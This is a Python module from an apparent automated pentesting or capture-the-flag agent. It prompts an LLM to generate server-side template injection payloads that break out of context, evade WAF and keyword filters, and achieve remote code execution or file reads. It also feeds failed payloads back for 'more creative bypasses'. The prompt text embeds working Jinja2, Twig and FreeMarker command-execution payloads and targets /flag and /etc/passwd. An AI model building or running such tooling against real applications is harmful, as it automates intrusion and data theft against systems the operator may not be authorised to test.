"""
Enhanced LLM-powered SSTI payload generation with context-awareness
"""
from dataclasses import dataclass
from typing import List
from ..ssti_detector import TemplateEngine
from .context_analyzer import TemplateReflection, TemplateContext
from .filter_detector import SSTIFilterProfile


@dataclass
class SSTIPayload:
    """Generated SSTI payload"""
    payload: str
    technique: str
    confidence: float
    reasoning: str
    expected_output: str


class SSTILLMEngine:
    """Generates context-aware SSTI payloads using LLM intelligence"""

    def __init__(self, llm_client, cost_tracker=None):
        self.llm_client = llm_client
        self.cost_tracker = cost_tracker

    async def generate_context_aware_payloads(
        self,
        engine: TemplateEngine,
        reflection: TemplateReflection,
        filter_profile: SSTIFilterProfile,
        goal: str = "rce",
        num_payloads: int = 5
    ) -> List[SSTIPayload]:
        """
        Generate context-aware SSTI payloads based on reflection context and filters

        Args:
            engine: Detected template engine
            reflection: Where and how input is reflected
            filter_profile: Detected filters and WAFs
            goal: Goal of exploitation ('rce', 'file_read', 'info_leak')
            num_payloads: Number of payloads to generate

        Returns:
            List of SSTIPayload objects
        """

        prompt = self._build_context_aware_prompt(
            engine, reflection, filter_profile, goal, num_payloads
        )

        try:
            # Get model and call LLM properly
            from src.xss_agent.llm_client import get_default_model
            model = get_default_model()

            messages = [{"role": "user", "content": prompt}]

            llm_response = self.llm_client.chat_completion(
                model=model,
                messages=messages,
                max_tokens=3000,
                temperature=0.7
            )

            response = llm_response["choices"][0]["message"]["content"]

            if self.cost_tracker:
                # Track API cost
                self.cost_tracker.add_call("ssti_payload_generation", tokens=3000)

            return self._parse_llm_response(response)

        except Exception as e:
            print(f"    ❌ LLM generation failed: {e}")
            return []

    def _build_context_aware_prompt(
        self,
        engine: TemplateEngine,
        reflection: TemplateReflection,
        filter_profile: SSTIFilterProfile,
        goal: str,
        num_payloads: int
    ) -> str:
        """Build a detailed prompt for context-aware payload generation"""

        prompt = f"""You are a penetration testing expert specializing in Server-Side Template Injection (SSTI).

DETECTED TEMPLATE ENGINE: {engine.value}

REFLECTION CONTEXT:
- Context Type: {reflection.context.value}
- Surrounding Syntax: {reflection.surrounding_syntax}
- Inside Quotes: {reflection.in_quotes} ({reflection.quote_type if reflection.in_quotes else 'N/A'})
- Breakout Needed: {reflection.breakout_needed}

Context Before Injection:
...{reflection.context_before}[INJECTION]

Context After Injection:
[INJECTION]{reflection.context_after}...

DETECTED FILTERS:
- Strictness: {filter_profile.strictness_level}
- WAF Signature: {filter_profile.waf_signature}
"""

        if filter_profile.blocked_keywords:
            prompt += f"- Blocked Keywords: {', '.join(filter_profile.blocked_keywords)}\n"

        if filter_profile.blocked_functions:
            prompt += f"- Blocked Functions: {', '.join(filter_profile.blocked_functions)}\n"

        if filter_profile.blocked_attributes:
            prompt += f"- Blocked Attributes: {', '.join(filter_profile.blocked_attributes)}\n"

        if filter_profile.blocked_characters:
            prompt += f"- Blocked Characters: {', '.join(filter_profile.blocked_characters)}\n"

        prompt += f"\nBYPASS HINTS:\n"
        for hint in filter_profile.bypass_hints:
            prompt += f"- {hint}\n"

        if goal == "rce":
            prompt += f"""
EXPLOITATION GOAL: Remote Code Execution (RCE)
Target Commands:
1. cat /flag.txt or cat /flag (primary)
2. ls / or find / -name flag* (secondary)
3. Any command that reveals the flag

TASK: Generate {num_payloads} SSTI payloads that will:
1. Break out of the current reflection context ({reflection.context.value})
2. Work with {engine.value} template engine syntax
3. Bypass the detected filters (strictness: {filter_profile.strictness_level})
4. Execute commands to find and read the flag
5. Be syntactically correct and executable

IMPORTANT BYPASS STRATEGIES:
"""
        elif goal == "file_read":
            prompt += f"""
EXPLOITATION GOAL: File Read
Target Files: /flag, /flag.txt, /etc/passwd, /app/flag.txt

TASK: Generate {num_payloads} SSTI payloads that will:
1. Break out of the current context
2. Read sensitive files
3. Bypass detected filters
"""

        # Add engine-specific guidance
        if engine == TemplateEngine.JINJA2:
            prompt += """
JINJA2 SPECIFIC TECHNIQUES:
- Access config, lipsum, namespace, cycler, etc.
- Use __globals__, __builtins__, __import__
- Alternative: request.application.__globals__.__builtins__
- Bypass underscores: Use request.args to pass variables
- Bypass dots: Use [] notation or |attr filter
- Example: {{lipsum.__globals__.os.popen('cat /flag').read()}}
- Advanced: {{namespace.__init__.__globals__.os.popen('cat /flag').read()}}
"""
        elif engine == TemplateEngine.TWIG:
            prompt += """
TWIG SPECIFIC TECHNIQUES:
- Use _self.env.registerUndefinedFilterCallback
- Filter abuse: {{['id']|filter('system')}}
- Alternative: {{_self.env.get Filter}}
"""
        elif engine == TemplateEngine.FREEMARKER:
            prompt += """
FREEMARKER SPECIFIC TECHNIQUES:
- Use ?new() to instantiate classes
- Execute class: freemarker.template.utility.Execute
- Example: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}
"""

        prompt += f"""

For each payload, provide:
1. The COMPLETE payload with all breakout sequences
2. The technique used (be specific)
3. Confidence score (0.0-1.0) based on filters
4. Step-by-step reasoning explaining:
   - How it breaks out of context
   - How it bypasses filters
   - Why it should work
5. Expected output pattern to detect success

FORMAT (exactly as shown):
PAYLOAD: <complete_payload_with_breakouts>
TECHNIQUE: <specific_technique_name>
CONFIDENCE: <0.0-1.0>
REASONING: <detailed_step_by_step_explanation>
EXPECTED: <what_output_indicates_success>
---

Generate {num_payloads} DIFFERENT payloads using VARIED techniques and bypass methods.
"""

        return prompt

    def _parse_llm_response(self, response: str) -> List[SSTIPayload]:
        """Parse LLM response into SSTIPayload objects"""
        payloads = []

        # Split by separator
        blocks = response.split('---')

        for block in blocks:
            block = block.strip()
            if not block:
                continue

            # Extract fields
            payload = None
            technique = None
            confidence = 0.5
            reasoning = ""
            expected = ""

            for line in block.split('\n'):
                line = line.strip()
                if line.startswith('PAYLOAD:'):
                    payload = line[8:].strip()
                elif line.startswith('TECHNIQUE:'):
                    technique = line[10:].strip()
                elif line.startswith('CONFIDENCE:'):
                    try:
                        confidence = float(line[11:].strip())
                    except:
                        confidence = 0.5
                elif line.startswith('REASONING:'):
                    reasoning = line[10:].strip()
                elif line.startswith('EXPECTED:'):
                    expected = line[9:].strip()

            if payload and technique:
                payloads.append(SSTIPayload(
                    payload=payload,
                    technique=technique,
                    confidence=confidence,
                    reasoning=reasoning,
                    expected_output=expected
                ))

        return payloads

    async def refine_failed_payload(
        self,
        failed_payload: SSTIPayload,
        error_message: str,
        filter_profile: SSTIFilterProfile
    ) -> List[SSTIPayload]:
        """
        Refine a failed payload based on error feedback

        Args:
            failed_payload: The payload that failed
            error_message: Error or response received
            filter_profile: Current filter profile

        Returns:
            List of refined payloads
        """

        prompt = f"""A SSTI payload failed. Analyze the failure and generate improved alternatives.

FAILED PAYLOAD:
{failed_payload.payload}

TECHNIQUE USED:
{failed_payload.technique}

ORIGINAL REASONING:
{failed_payload.reasoning}

ERROR/RESPONSE RECEIVED:
{error_message[:500]}

KNOWN FILTERS:
- Blocked Keywords: {', '.join(filter_profile.blocked_keywords)}
- Blocked Functions: {', '.join(filter_profile.blocked_functions)}
- Blocked Characters: {', '.join(filter_profile.blocked_characters)}

TASK: Generate 3 REFINED payloads that:
1. Address the specific failure reason
2. Use different bypass techniques
3. Avoid whatever caused the failure

For each payload:
PAYLOAD: <refined_payload>
TECHNIQUE: <new_technique>
CONFIDENCE: <0.0-1.0>
REASONING: <why_this_addresses_the_failure>
EXPECTED: <success_indicator>
---
"""

        try:
            # Get model and call LLM properly
            from src.xss_agent.llm_client import get_default_model
            model = get_default_model()

            messages = [{"role": "user", "content": prompt}]

            llm_response = self.llm_client.chat_completion(
                model=model,
                messages=messages,
                max_tokens=2000,
                temperature=0.8  # Higher temp for more creative bypasses
            )

            response = llm_response["choices"][0]["message"]["content"]

            return self._parse_llm_response(response)

        except Exception as e:
            print(f"    ❌ Payload refinement failed: {e}")
            return []
